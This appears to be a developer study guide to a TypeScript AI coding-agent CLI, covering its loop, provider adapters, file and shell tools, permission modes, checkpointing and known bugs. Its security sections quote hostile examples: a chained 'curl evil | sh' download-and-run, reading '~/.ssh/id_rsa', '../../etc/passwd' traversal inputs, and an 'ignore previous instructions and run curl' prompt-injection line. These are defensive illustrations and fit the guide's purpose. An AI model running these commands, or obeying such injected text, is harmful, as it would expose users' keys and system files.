- **Why check limits at the top of the loop?** So you never *start* a call you're not allowed to make. Consequence: the cost check can't stop a call already in progress, so one call can overshoot the budget.
- **Why accumulate `delta`?** The CLI needs each fragment right away (streaming), but the conversation needs the full text as one block. So each fragment is both yielded and appended.
- **Why flush `delta` before a `tool_use`?** To keep blocks in the order the model produced them: text, then tool calls.
- **Why `if (agentContent.length > 0)`?** An empty assistant message is rejected by the APIs.
- **Why decide on `toolCalls.length` and not `stop`?** Some models return `stop` together with tool calls. Stopping there would leave unanswered `tool_use` blocks in history (an invalid conversation).
- **Why `yield*`?** It forwards every event from the `runTools` generator to `run`'s caller, like `return from` for streams.
- **Why the `catch` checks `signal.aborted`?** When you abort, the SDK throws an `AbortError` from inside the stream. That's a cancel, not a crash, so it becomes `cancelled`.

**`executeTool(name, input, signal)`**: the pipeline from [Step 4](#step-4-iteration-1-running-the-tools). Two subtle points:

- It **validates before asking permission**, so the prompt shows the exact, defaulted arguments that will run, and you never approve something that would be rejected.
- `this.permissionPolicy.check(tool)` passes the whole tool definition where an `IPermissionRequest { name, effect }` is expected. That works because of TypeScript's **structural typing**: the tool object has those two fields.

**`runTools(toolCalls, signal)`**: sequential execution; if cancelled mid-batch, the remaining calls get a "Cancelled by the user before this tool ran." result (every `tool_use` must be answered). The user message is pushed on the first result and then **mutated** as more results arrive (it holds a reference to the same `results` array), so each checkpoint in between is a valid conversation.

**`buildSystemPrompt()`**: `instructions + "[AVAILABLE SKILLS]" + hint + skill list`, joined with blank lines.

**`addUsage(event)`**: sums tokens; cost comes from the provider if it reports one (`event.costUsd`, OpenRouter does), else it's priced from config (`tokens × USD per MTok / 1,000,000`). The `??` means "use the right side only if the left is `null`/`undefined`".

**`finish(status, outcome)`**: final checkpoint plus the `run_finished` log line.

**`checkpoint(status)`**: saves `{ executionId, agent name, task, iteration, status, messages, updatedAt }`. It's called after every model reply, after every tool result, and at the end.

**`loadMemoryCheckpoint()`**: on resume, loads the old messages, **repairs** them, then appends the new task as a user message.

**`toToolResultBlock(id, result)`** (module function): success sends `content`; failure sends `Error: <error>` **plus** the content (so a failing test's stdout still reaches the model).

### [runtime/history.ts](src/runtime/history.ts): `repairHistory(messages)`

A **pure function** (no I/O), easy to test. It makes a saved conversation valid before it's resent:

1. Removes messages with empty content (APIs reject them).
2. Finds the last assistant message and its `tool_use` ids.
3. Collects `tool_result` ids after it.
4. For each unanswered id, adds a synthetic `tool_result` with `isError: true` and the text "Interrupted: … It may or may not have taken effect, so check before retrying."

Why that wording matters: if the process died while `fs_write` was running, you don't know whether the write happened. Telling the model "check before retrying" makes it verify instead of blindly repeating a side effect. Backend analogy: at-least-once delivery, so tell the consumer to be idempotent.

### [runtime/executionMemory.ts](src/runtime/executionMemory.ts): `ExecutionMemory`

The checkpoint store, one JSON file per execution in `memory/`.

- **`save()`**: writes to `<id>.json.<pid>.tmp`, then `rename()`s it over `<id>.json`. `rename` is atomic on the same filesystem, so a crash leaves either the old or the new file, never half a file.
- **`load()`**: distinguishes three cases:
  - `ENOENT` (no file) → `null` (a fresh execution),
  - other read error → rethrow,
  - invalid JSON → `EcoError("CHECKPOINT_CORRUPT")` with a clear message. It deliberately doesn't return `null`, because that would silently start over and lose history.

Note: "memory" here means **conversation persistence** (like a job snapshot), not long-term knowledge the agent learns.

## 4.4 `providers/`: talking to models

### [providers/index.ts](src/providers/index.ts): the port

The vendor-neutral contract the runtime depends on:

```ts
interface Provider {
  complete(request: ICompleteRequest): AsyncGenerator<IProviderEvent>;
}
```

- `ICompleteRequest { model, system, messages, tools, signal }`
- `IProviderEvent`: exactly four normalized kinds: `text`, `tool_use` (**already complete and parsed**), `usage`, `stop`.
- `IModelTool { name, description, inputSchema: TJsonSchema }`: plain JSON Schema; providers never see Zod.

The contract promise: *whatever the vendor does, the loop receives these four event types, and `tool_use` events arrive with full, parsed input.* All the vendor mess stays inside the adapters.

The bottom of the file (`TChatMessages`, `TChatRequest`, `TToolCallAccumulator`, `TChunk`) are OpenRouter-specific helper types. They'd arguably belong in `openrouter.ts`, since they're not part of the neutral port.

### [providers/openrouter.ts](src/providers/openrouter.ts): `OpenRouterProvider` (in use)

**Outbound (request mapping):**

- `mapMessages()`: system prompt becomes the first message, then each internal message goes through `mapMessage()`.
- `mapMessage()`: the key translation. A string message passes through. A block message is split:
  - text + tool_use → **one** `assistant` message with `content` (joined text or `null`) and `toolCalls`, where `arguments` is the input **re-serialized to a JSON string** (OpenAI format wants a string);
  - text only → one message with that role;
  - each `tool_result` → its own `{ role: "tool", toolCallId, content }` message.
- `mapTools()`: wraps each tool as `{ type: "function", function: { name, description, parameters } }`.

**Inbound (stream handling):**

- Each chunk has `choices[0].delta`. Text is yielded immediately.
- Tool call fragments are grouped by **`index`** (not id: the id only appears in the first fragment) in a `Map<number, accumulator>`. The first fragment creates the entry, later ones append to `arguments`.
- `usage` may come on a chunk with no `choices` (the final chunk), so both paths handle it, guarded by `usageEmitted` so it's counted once. `usage.cost` (real USD cost reported by OpenRouter) becomes `costUsd`.
- `finishReason` maps: `tool_calls` → `tool_use`, `length` → `max_tokens`, `stop`/other → `end_turn`.
- **After** the stream ends, each accumulated call is parsed (`parseToolArguments`; bad JSON becomes `{}`, which then fails Zod validation with a readable error) and yielded as `tool_use`. Finally a `stop` event.

Other details: the constructor throws if `OPENROUTER_API_KEY` is missing (fail fast). The `as unknown as AsyncIterable<unknown>` cast plus the hand-written `TChunk` type is a pragmatic workaround for the SDK's types.

### [providers/anthropic.ts](src/providers/anthropic.ts): `AnthropicProvider` (written, not wired in)

Same contract, Anthropic's native event model:

| SDK event | What the adapter does |
| --- | --- |
| `message_start` | yield `usage` (initial input + output tokens) |
| `content_block_start` (tool_use) | remember `id` and `name` |
| `content_block_delta` / `text_delta` | yield `text` immediately |
| `content_block_delta` / `input_json_delta` | append `partial_json` to a buffer |
| `content_block_stop` | if a tool block was open: `JSON.parse` buffer, yield `tool_use`, reset |
| `message_delta` | yield `usage` for **new** output tokens only (Anthropic sends a running total); yield `stop` with mapped reason |

Anthropic streams blocks one at a time (they don't interleave), so a single set of `toolId/toolName/toolInput` variables is enough, unlike OpenRouter where calls are keyed by index.

Mapping out is nearly 1:1 because the internal format is Anthropic-shaped: `toolUseId` → `tool_use_id`, `isError` → `is_error`, `inputSchema` → `input_schema`, `system` is a top-level field.

Anthropic doesn't report cost, which is why `inputUsdPerMTok`/`outputUsdPerMTok` exist.

## 4.5 `tools/`: what the agent can do

### [tools/catalog.ts](src/tools/catalog.ts): `ToolCatalog`

A registry: every tool the *program* knows (`set`, `get`, `list`). `createToolSet(names)` picks a subset for one execution and throws if a name is unknown. Why two classes? The catalog is global; the toolset is **per agent**. Today they're identical (all six), but when agent files get a `tools = [...]` list, different agents get different toolsets from the same catalog.

### [tools/toolSet.ts](src/tools/toolSet.ts): `ToolSet`

The tools one execution may use: `get`, `list`, `has`, and `modelTools()`, which converts Zod to JSON Schema **once**, at the boundary, so no provider needs to know Zod. `toInputJsonSchema` uses `z.toJSONSchema(schema, { io: "input" })` so defaulted fields are optional (what the model may *send*), and strips the `$schema` key with a rest destructure.

### [tools/fs.ts](src/tools/fs.ts): file tools

**`FileResolver`**, the shared safety helper:

- `resolveFilePath(root, requested)`: the **path jail**. Resolve the path against the root, compute the path relative to the root, and reject it if that relative path starts with `..` or is absolute (a different drive on Windows). So `../../etc/passwd` and `/etc/passwd` are rejected. Backend analogy: path-traversal protection on a file-download endpoint.
- `truncateOutput(content)`: caps output at `MAX_OUTPUT_BYTES` (30 KB) and appends `...[truncated N bytes]...`. It measures **bytes**, not characters, because that's what costs tokens. It keeps the head (a byte cut can split a multi-byte character; Node replaces the broken bytes with `�`).

**`FsRead`** (`fs_read`, effect `read`): jail → `readFile` utf-8 → truncate.

**`FsGlob`** (`fs_glob`, effect `read`): uses Node's built-in `fs/promises.glob` (Node 22+). Layers of defense:

1. Reject absolute patterns and any `..` segment.
2. `exclude` skips `node_modules` and `.git` during the walk.
3. Every match is checked **again** (ignored dirs + jail), because patterns like `{..,src}/*` can expand past the string check.
4. At most 200 matches shown, with a "N more" note, then truncated.
5. Zero matches returns a helpful `No files matched "…"` instead of an empty string (an empty result makes models loop).

**`FsWrite`** (`fs_write`, effect `write`): jail → if `overwrite` is false and the file exists (`access` succeeds), return an error telling the model to set `overwrite: true` → `mkdir -p` the parent → write. The "refuse to overwrite by default" design protects existing files from a careless model.

**`FsMkdir`** (`fs_mkdir`, effect `write`): jail → `mkdir -p`.

Every handler wraps its body in `try/catch` and returns `{ ok: false, error }`, following the "never throw" rule.

### [tools/shell.ts](src/tools/shell.ts): `ShellExec` (`shell_exec`, effect `exec`)

Input: `{ command: string, args: string[] }`, not a command line. Design decisions:

- **`shell: false`**: the program is executed directly, with no `/bin/sh`. So `&&`, `|`, `>`, `$VAR`, globs don't work. One approval runs exactly one program with exactly those args; the model can't sneak in `; curl evil | sh`.
- **This is not a sandbox.** `cat ~/.ssh/id_rsa` is still one program with one argument. The permission prompt, which shows the full command, is the real protection.
- **`detached: true`** puts the child in its own **process group**. `process.kill(-pid, "SIGKILL")` (negative pid = the group) then kills the program *and everything it started* (npm → node → …). Side effect: the child doesn't receive the terminal's Ctrl-C, so the code must kill it explicitly on abort, which it does.
- **Timeout:** 60 s, then kill the group; the status says "timed out".
- **Cancellation:** `context.signal` gets an `abort` listener that kills the group; `cleanup()` removes the listener and timer (no leaks).
- **`child.on("error")`**: the program couldn't start (for example not installed) → a readable error.
- **`child.on("close")`**: builds content: the command line, `(exit code N)` or other status, `STDOUT:`, `STDERR:`. Output is **always** returned, even on failure, because a failing test's output is what the model needs to fix it. `ok` is `code === 0`.
- **`handler` returns `new Promise(...)`**: wraps the callback/event-based child process API into a promise, a classic Node pattern.

**`OutputCollector`**: buffers chunks, stops storing after 10 MB (memory safety; counts dropped bytes), and if the total exceeds 30 KB keeps the **first half and last half**. The start shows what ran; the end usually has the error or test summary.

### [tools/skill.ts](src/tools/skill.ts): `OpenSkill` (`open_skill`, effect `meta`)

Takes `{ name }`, calls `skillLoader.open(name)`, returns the skill's instructions as the tool result. The loaded instructions become part of the conversation from then on. This is the "load on demand" half of progressive disclosure. It depends on the `ISkillLoader` interface, not the class.

## 4.6 `permissions/`: the safety gate

### [permissions/index.ts](src/permissions/index.ts)

Types: `TPermissionMode` (`strict | standard | yolo`), `TPermissionDecision` (`allow | ask | deny`), `IPermissionRequest { name, effect }`, `IPermissionPolicy.check()`, `IPermissionPrompt { toolName, input }` and `IPermissionPrompter.confirm(prompt, signal)`.

Separating **policy** (a pure decision) from **prompter** (I/O) means the policy is trivially unit-testable, and the prompter can later be swapped for a web UI or Slack approval without touching the loop.

### [permissions/policy.ts](src/permissions/policy.ts): `PermissionPolicy`

The decision table as implemented:

| Mode | read | meta | write | exec |
| --- | --- | --- | --- | --- |
| `strict` | allow | **deny** | deny | deny |
| `standard` (default) | allow | allow | ask | ask |
| `yolo` | allow | allow | allow | allow |

Unknown modes fall back to strict; unknown effects fall back to deny (strict) or ask (standard). **Fail closed**: when in doubt, be restrictive.

Note two differences from [README.md](README.md)'s table: strict *denies* write/exec rather than asking, and it also denies `meta`, so `open_skill` can't be used in strict mode. See [Part 9](#part-9-known-gaps-and-bugs).

### [permissions/cliPrompter.ts](src/permissions/cliPrompter.ts): `CliPermissionPrompter`

- Creates a `readline` interface **per prompt** and closes it in `finally` (so it doesn't hold stdin open between prompts).
- Shows the tool name plus the **pretty-printed parsed input**, capped at 2,000 chars by `preview()`.
- Passes `{ signal }` to `question()` so Ctrl-C during a prompt cancels it.
- While readline owns the terminal, it intercepts Ctrl-C and emits its own `SIGINT` event. The handler re-emits it on `process`, so the CLI's cancel logic still fires.
- Only `y`/`yes` (case-insensitive) is a yes. Anything else, including Enter, is **no** (safe default, as `[y/N]` suggests).

A denial is returned to the model as a normal failed tool result ("The user denied this action."), not an exception, so the model can try something else or explain.

## 4.7 `utils/`: the run log

### [utils/index.ts](src/utils/index.ts) and [utils/logger.ts](src/utils/logger.ts): `Logger`

Appends one JSON object per line (**JSONL**) to `logs/<runId>.jsonl`:

- `start(task)` → `run_started`
- `event(e)` → `event` wrapping a `tool_start` or `tool_result`
- `done(summary)` → `run_finished` with outcome, iterations and usage

Why JSONL? Append-only, crash-tolerant (a partial last line doesn't corrupt earlier ones), `grep`-able and `jq`-able. It's the seed of an event store. Every `write` does `mkdir -p` then `appendFile`, which is simple but opens the file on every event.

Debugging tip from the README worth repeating: when the agent behaves strangely, **read the log first**. Most "bugs" are a tool returning something unhelpful, not the loop being wrong.

The log doesn't record the model's text or the tool inputs. The checkpoint (`memory/<id>.json`) has the full conversation, so check that for "what did the model actually see and say".

## 4.8 CLI: [cli/index.ts](src/cli/index.ts)

Already walked through in [Part 3](#part-3-one-real-run-traced-end-to-end). Its three jobs:

1. **Composition root**: create every concrete object and inject dependencies.
2. **Renderer**: a `switch` over `TAgentEvent`s. It's the only code that prints the agent's output.
3. **Process concerns**: argv, SIGINT → `AbortController`, exit codes.

`EXIT_CODES` maps outcomes to Unix exit codes: 0 done, 1 hit iteration limit, 4 over budget, 130 cancelled (130 = 128 + SIGINT's number 2, the Unix convention). A crash goes through `.catch` → exit 1; a bad usage → exit 2. `process.exitCode = …` (rather than `process.exit()`) lets the process finish cleanly (flush output, run `finally`).

Note: `commander` and `picocolors` are dependencies but aren't used yet; args are parsed by hand.

## 4.9 Data files

### [agents/general.toml](agents/general.toml)

The agent **is data, not code**: `name`, `model` (`openrouter/free`, overridden by `MODEL` in `.env`), `description`, and `instructions` (which becomes the system prompt). The instructions set an "observe → plan → execute → verify" workflow and forbid reading the `memory/` folder (it contains past conversations; reading them would pollute context).

### [skills/code-review/SKILL.toml](skills/code-review/SKILL.toml) and [skills/scientific-review/SKILL.toml](skills/scientific-review/SKILL.toml)

`name` (must equal the folder name), `description` (goes into the system prompt, so it must say *when* to use the skill), `instructions` (returned by `open_skill`).

---

# Part 5: Data flow in detail

## 5.1 Three layers of events

Events are transformed three times on their way to your screen. Each layer hides the one below.

```
 Vendor SSE                  Provider adapter            AgentLoop                 CLI
 (vendor-specific)           (IProviderEvent)            (TAgentEvent)             (output)
 ───────────────────         ────────────────            ──────────────            ─────────
 delta.content ───────────▶  text ─────────────────────▶ text ───────────────────▶ stdout.write
 delta.toolCalls[] ─┐
 (JSON fragments)   │ accumulate by index
                    └──────▶ tool_use (parsed) ────────▶ tool_start ─────────────▶ "[tool] name"
                                                          └▶ executeTool ─▶ tool_result ▶ "[tool result] …"
 usage chunk ─────────────▶  usage ────────────────────▶ (summed into this.usage)
 finishReason ────────────▶  stop ─────────────────────▶ (ignored)
                                                          end of run ▶ done ──────▶ summary + exit code
                                                          logger ◀── tool_start / tool_result / done
```

Because each layer is an **async generator** consumed with `for await`, this is a **pull-based** pipeline with natural backpressure: the provider doesn't read the next chunk until the loop asks for it, and the loop doesn't continue until the CLI has handled the event.

## 5.2 The request path (what you send)

```
 agents/general.toml ──▶ AgentDefination.instructions ─┐
 skills/*/SKILL.toml ──▶ SkillLoader ─▶ "- name: desc" ─┼─▶ buildSystemPrompt() ─▶ system
                                                         │
 Zod schemas in tool classes ──▶ ToolSet.modelTools() ──┼──────────────────────▶ tools (JSON Schema)
                                                         │
 argv task ─┐                                            │
 checkpoint ├─▶ repairHistory ─▶ this.messages ──────────┼──────────────────────▶ messages
 (resume)   ┘        ▲  (+ assistant replies, tool results each iteration)
                     │
 .env MODEL / agent model ──▶ Loader ──▶ config.model ──────────────────────────▶ model
                                                         ▼
                                            ICompleteRequest (internal format)
                                                         ▼
                                   OpenRouterProvider.mapMessages/mapTools
                                                         ▼
                                            HTTPS POST, stream: true
```

## 5.3 The persistence flow (what's written, when)

| Moment | `memory/<executionId>.json` | `logs/<runId>.jsonl` |
| --- | --- | --- |
| Run starts | — | `run_started` |
| Model requests a tool | — | `event: tool_start` |
| Model reply finished | checkpoint `running` | — |
| Each tool result | checkpoint `running` | `event: tool_result` |
| Run ends | checkpoint with final status | `run_finished` |

## 5.4 Execution status lifecycle

```
                     ┌──────────────── --resume <id> "<new task>" ──────────────┐
                     ▼                                                           │
   new run ──▶ ┌──────────┐  no tool calls        ┌───────────┐                  │
               │ running  │ ────────────────────▶ │ completed │ ─────────────────┤
               └──────────┘                       └───────────┘                  │
                │  │  │     iteration or cost    ┌───────────┐                   │
                │  │  └──── limit reached ─────▶ │  paused   │ ──────────────────┤
                │  │                             └───────────┘                   │
                │  │  Ctrl-C (abort)             ┌───────────┐                   │
                │  └───────────────────────────▶ │ cancelled │ ──────────────────┤
                │                                └───────────┘                   │
                │     unexpected error           ┌───────────┐                   │
                └──────────────────────────────▶ │  failed   │ ──────────────────┘
                                                 └───────────┘
```

Any status can be resumed. Resuming loads the messages (repaired) and appends your new task as the next user message. The **status is written but never read back**: `--resume` doesn't check it, and `iteration` restarts at 0 (see [Part 9](#part-9-known-gaps-and-bugs)).

---

# Part 6: Cross-cutting concerns

## 6.1 Cancellation: one signal, everywhere

A single `AbortController` is created in the CLI. Its `signal` travels down to everything that can block:

```
 Ctrl-C ─▶ process SIGINT ─▶ onSigint() ─▶ abort.abort()
                                              │
             abort.signal ────────────────────┤
                ├─▶ AgentLoop.run: checked at top of every iteration
                ├─▶ provider SDK (fetch): stream throws AbortError → caught → "cancelled"
                ├─▶ CliPermissionPrompter: readline.question({signal}) rejects → returns false
                ├─▶ runTools: remaining calls get "Cancelled by the user before this tool ran."
                └─▶ ShellExec: 'abort' listener kills the whole process group
 Second Ctrl-C ─▶ onSigint() sees aborted ─▶ process.exit(130)
```

Result: a first Ctrl-C always leaves a valid checkpoint with status `cancelled`. Backend analogy: Go's `ctx.Done()`, or cancelling an HTTP request's context so downstream DB queries stop too.

## 6.2 Error handling strategy: three kinds of failure

| Kind | Examples | Handling | Why |
| --- | --- | --- | --- |
| **Expected, recoverable by the model** | file not found, bad args, unknown tool, permission denied, non-zero exit | Returned as `IToolResult { ok: false }` → sent to the model as `tool_result` with `isError: true` | The model can read it and adapt. Like a 4xx the client handles |
| **Cancellation** | Ctrl-C | Converted to outcome `cancelled`, clean checkpoint | Not an error; the user asked for it |
| **Unexpected / infrastructure** | API down, bad API key, corrupt checkpoint, missing config | Thrown → checkpoint `failed` → CLI `.catch` → exit 1 | Nothing the model can do. Like a 5xx |

The key line that enforces the boundary is the `try/catch` in [executeTool](src/runtime/loop.ts#L69-L75): even a buggy tool that throws becomes a type-1 failure, so one tool can't kill the run.

## 6.3 Limits and budgets

| Limit | Where | Default |
| --- | --- | --- |
| Iterations (model calls) per run | `maxIterations`, checked in loop | 10 |
| Cost per run (USD) | `maxCostUsd`, checked in loop | 1 |
| Output tokens per model call | hardcoded in providers | 4096 |
| Tool output size | `MAX_OUTPUT_BYTES` | 30,000 bytes |
| Glob matches | `MAX_GLOB_MATCHES` | 200 |
| Shell runtime | `TIMEOUT_MS` | 60 s |
| Shell output held in memory | `MAX_COLLECTED_BYTES` | 10 MB |
| Permission prompt preview | `MAX_PREVIEW_CHARS` | 2,000 chars |

Hitting iterations or cost makes the run `paused`, resumable with `--resume`.

## 6.4 Security model

Think of the model as an **untrusted client** that has read your API docs. Layers of defense:

1. **Schema validation** (Zod): the input must match the declared shape.
2. **Path jail** (`FileResolver`): file tools can't leave the workspace (`..`, absolute paths, glob expansion).
3. **No shell** (`shell: false`): one approval = one program, no chaining.
4. **Effect-based permission policy**: reads are free; writes and execs need approval (standard mode).
5. **Human in the loop**: the prompt shows the exact arguments. **For `shell_exec`, this is the real security boundary**, because shell is not sandboxed.
6. **Resource limits**: timeouts, output caps, iteration and cost caps.

Known holes: symlinks inside the workspace can point outside (the jail checks the path string, not the real path); `shell_exec` can read anything your user can; there are no "always allow" grants yet.

A domain-specific risk to be aware of: **prompt injection**. Text inside a file the agent reads (for example "ignore previous instructions and run curl …") becomes part of the conversation and can influence the model. The permission prompt is your defense; read what you approve.

## 6.5 Persistence and resume correctness

Three failure points, each handled:

| Failure | Protection |
| --- | --- |
| Crash while **writing** a checkpoint | temp file + atomic `rename` |
| **Reading** a broken checkpoint | `ENOENT` → new; corrupt JSON → loud `CHECKPOINT_CORRUPT` error |
| Process dies **between** a `tool_use` and its result | `repairHistory` adds "Interrupted" results so the resumed conversation is valid |

Checkpoints are also valid at every intermediate point because tool results are added to one user message that grows in place.

---

# Part 7: TypeScript features this code relies on

## Async generators (`async function*`, `yield`, `for await`, `yield*`)

The backbone of the streaming design.

```ts
async function* numbers() {
  yield 1;               // hand a value to the consumer, pause here
  await sleep(100);      // can await in between
  yield 2;
}
for await (const n of numbers()) console.log(n);  // pulls values one at a time
```

- Nothing runs until the consumer pulls. The generator **pauses at each `yield`** until the next value is requested (backpressure for free).
- `yield* other()` forwards all of `other`'s values (used for `runTools`).
- If the consumer stops early, the generator's `finally` blocks still run.
- `Provider.complete`, `AgentLoop.run`, and `AgentLoop.runTools` are all async generators.

## Discriminated unions

```ts
type TAgentEvent = { type: "text"; delta: string } | { type: "done"; outcome: TRunOutcome; … }
switch (event.type) { case "text": event.delta /* TS knows this exists */ }
```

A shared literal field (`type`) lets TypeScript narrow the type in each `switch` branch. Used for every event and content block type.

## Structural typing

TypeScript checks shapes, not class names. `policy.check(tool)` accepts a full `IToolDefinition` where an `IPermissionRequest { name, effect }` is expected, because it has those fields. Similarly, any object with the right methods "is" a `Provider`.

## Type predicates and `Extract`

- `isPermissionMode(v): v is TPermissionMode` narrows a `string` after the check.
- `filter((b): b is Extract<IContentBlock, { type: "text" }> => b.type === "text")` in the OpenRouter adapter gives a correctly typed array of text blocks.

## `satisfies`, `Omit`, `Record`, `z.infer`

- `x satisfies T`: check against `T` without changing `x`'s declared type.
- `Omit<IToolContext, "signal">`: the context without `signal` (added per call).
- `Record<TRunOutcome, number>`: an object with a key for **every** outcome; add an outcome and the compiler forces you to update `EXIT_CODES` and `STATUS_FOR_OUTCOME`.
- `z.infer<typeof schema>`: derive the TypeScript type from a Zod schema, so there's one source of truth.

## Parameter properties and `!`

- `constructor(private readonly root: string) {}` declares and assigns a field in one go.
- `name!: string`: definite assignment assertion (set later, in `load()`).

## `import type`

`import type { X }` imports only types, erased at runtime. With `verbatimModuleSyntax` in [tsconfig.json](tsconfig.json), you **must** use it for type-only imports. It also keeps the runtime dependency graph clean (for example `runtime/index.ts` doesn't load the providers at runtime).

## Nullish coalescing and optional chaining

`a ?? b` uses `b` only when `a` is `null`/`undefined` (unlike `||`, which also skips `0` and `""`). `a?.b` returns `undefined` instead of throwing if `a` is nullish.

---

# Part 8: Configuration, commands and exit codes

## Commands

```bash
bun install
```

```bash
bun run dev "your task here"
```

```bash
bun run dev --resume <execution-id> "your follow-up task"
```

```bash
bun run typecheck
```

`bun run lint` and `bun run test` don't work yet: there's no `eslint.config.js` and no test files.

**Important:** everything is relative to the **current directory**: `.env`, `agents/`, `skills/`, `logs/`, `memory/`, and the workspace the tools can touch. Run it from the project root.

## Environment variables (`.env`)

| Key | Used by | Default | Meaning |
| --- | --- | --- | --- |
| `OPENROUTER_API_KEY` | `OpenRouterProvider` | **required** | API key |
| `MODEL` | `Loader` | agent file's `model` | Model id, for example an OpenRouter model slug |
| `permissionMode` | `Loader` | `standard` | `strict`, `standard` or `yolo` |
| `maxIterations` | `Loader` | 10 | Model calls per run |
| `maxCostUsd` | `Loader` | 1 | Budget per run in USD |
| `inputUsdPerMTok` / `outputUsdPerMTok` | `Loader` | 0 | Prices when the provider doesn't report cost |
| `MAX_OUTPUT_BYTES` | `fs.ts`, `shell.ts` | 30000 | Tool output cap (see bug 1 below: currently ignored from `.env` when run via `bun run dev`) |
| `ANTHROPIC_API_KEY` | `AnthropicProvider` | — | Only if you wire in the Anthropic adapter |

## Exit codes

| Code | Meaning |
| --- | --- |
| 0 | Completed |
| 1 | Hit the iteration limit, or crashed |
| 2 | Bad usage (missing task or execution id) |
| 4 | Over budget |
| 130 | Cancelled with Ctrl-C |

---

# Part 9: Known gaps and bugs

Found while writing this guide (beyond what [FIXES.md](FIXES.md) already covers). Each one is also a good learning exercise.

### Bugs

1. **`MAX_OUTPUT_BYTES` in `.env` is ignored under `bun run dev`.** ES modules evaluate all imports before the importing file's body. `fs.ts` and `shell.ts` read `process.env.MAX_OUTPUT_BYTES` at module load, which happens *before* `config({ path: ".env" })` runs in `cli/index.ts`. I verified this: under `tsx` (what `bun run dev` runs) the imported module sees the variable as unset. (Running the file directly with `bun src/cli/index.ts` hides the bug, because Bun loads `.env` itself.) Fix: `import "dotenv/config"` as the **first** import in `cli/index.ts`, or read the env var inside the function instead of at module level. `MODEL` and the API key aren't affected, because they're read later.
2. **`fs_write`/`fs_mkdir` glob check only rejects a *leading* `*`.** The regex `/^(?!\*)/` means "doesn't start with `*`", so `src/*.ts` passes (verified). The error message says "cannot contain glob wildcards". Fix: `/^[^*?[\]{}]*$/`.
3. **`strict` mode denies `open_skill`** (effect `meta`), so skills are unusable in strict mode. Loading instructions has no side effects; `meta` should probably be `allow` in strict too.
4. **Resume restarts the iteration counter.** `checkpoint.iteration` is saved but never read back, so a `paused` run gets a fresh `maxIterations` on each resume. The same goes for cost. That may be what you want, but it's implicit.
5. **Resuming after a mid-batch stop can produce two user messages in a row** (the tool-results message, then your new task). Anthropic's API accepts consecutive user turns; strict OpenAI-style providers accept a user message after `tool` messages too, so it works, but it's worth knowing.

### Gaps (not built yet)

- The Anthropic adapter exists but isn't selectable (the CLI always uses OpenRouter).
- The agent file is hardcoded to `general.toml`; no `--agent` flag; no per-agent tool list.
- No "allow for the rest of the run" (`a`) answer in the prompt.
- `fs_read` has no line range; there's no `fs_edit` (exact-string replace) or `fs_grep`.
- No tests and no ESLint config, so `bun run check` fails.
- Budget checks can't stop a call in progress, and there's no wall-clock limit.
- The path jail doesn't resolve symlinks (use `realpath()` before checking).
- The log doesn't record model text or tool inputs.
- Unused: `CliError`, `ISkillFrontMatter`, `commander`, `picocolors`, `TExecutionStatus` read-back.
- Everything depends on `process.cwd()`, so you can't run it against another repo from here without copying `agents/` and `skills/` there.

---

# Part 10: Exercises to lock in your understanding

Do these in order. Each is small and touches one concept.

1. **Read the wire.** Add a temporary `console.error(JSON.stringify(messages, null, 2))` in `OpenRouterProvider.complete` and run a task that uses a tool. Find the `tool_calls` and `role: "tool"` messages. Compare with `memory/<id>.json`.
2. **Break the contract on purpose.** In `runTools`, skip pushing one result. Run a task with two tool calls. Read the API error. Revert. You now understand why `repairHistory` exists.
3. **Write tests for the pure parts.** `PermissionPolicy.check` (a table test over mode × effect), `repairHistory`, `FileResolver.resolveFilePath` (including `../x`, `/etc/passwd`, `a/../../b`), `toToolResultBlock`. Use `vitest`.
4. **Fix bug 1** (dotenv ordering) and prove it with `MAX_OUTPUT_BYTES=100`.
5. **Add `fs_grep`.** Effect `read`, jailed, skips ignored dirs, capped output, helpful "no matches" message. You'll touch `fs.ts`, `cli/index.ts` (register it) and nothing else, which proves the architecture's extensibility.
6. **Add "allow for this run".** Change `confirm` to return `"yes" | "no" | "always"`, and keep a `Set<string>` of granted tool names in the loop.
7. **Make the provider selectable.** A `PROVIDER=anthropic|openrouter` env var in `Loader`, and a small factory in the CLI.
8. **Add a `--agent <name>` flag** and a `tools = [...]` list in agent files, using `catalog.createToolSet(agent.tools)`.
9. **Write a fake provider** (an async generator that yields scripted events) and test `AgentLoop` end to end without the network. This is how FIXES.md's 28 checks were done, and it's the single most valuable test you can have.

After exercise 9 you'll understand every line.

---

# Glossary

| Term | Meaning |
| --- | --- |
| **Agent** | An LLM in a loop that can call tools until a task is done |
| **Agent loop** | model call → run requested tools → append results → repeat |
| **Checkpoint** | Saved snapshot of an execution's conversation and status |
| **Content block** | One typed piece of a message: `text`, `tool_use` or `tool_result` |
| **Context window** | Max tokens the model can handle per call (input + output) |
| **Effect** | A tool's side-effect class (`read`/`write`/`exec`/`meta`), used by permissions |
| **Execution** | One task being worked on; can span several runs via resume |
| **JSON Schema** | A JSON description of valid JSON; how tools advertise their arguments |
| **JSONL** | One JSON object per line; append-friendly log format |
| **LLM** | Large language model; here, a stateless text-in/text-out API |
| **OpenRouter** | A gateway exposing many vendors' models through one OpenAI-style API |
| **Path jail** | Check that a resolved path stays inside the workspace root |
| **Progressive disclosure** | Advertise skills cheaply by name; load full text on demand |
| **Prompt injection** | Untrusted text (file contents, web pages) that tries to steer the model |
| **Provider / adapter** | Code that translates between the internal model API and a vendor's API |
| **Run** | One process invocation; has its own log file |
| **Skill** | A named set of instructions loaded on demand via `open_skill` |
| **SSE** | Server-Sent Events; the streaming HTTP format model APIs use |
| **Stop reason** | Why the model stopped writing (`end_turn`, `tool_use`, `max_tokens`) |
| **System prompt** | Standing instructions sent with every call |
| **Token** | The unit models read and bill by (~¾ of a word) |
| **Tool** | A function the model can ask you to run: name + description + schema + handler |
| **Tool call / `tool_use`** | The model's structured request to run a tool, with an id |
| **Tool result** | Your reply to a tool call, matched by id |
| **Zod** | A TypeScript validation library; schemas double as types and JSON Schema |
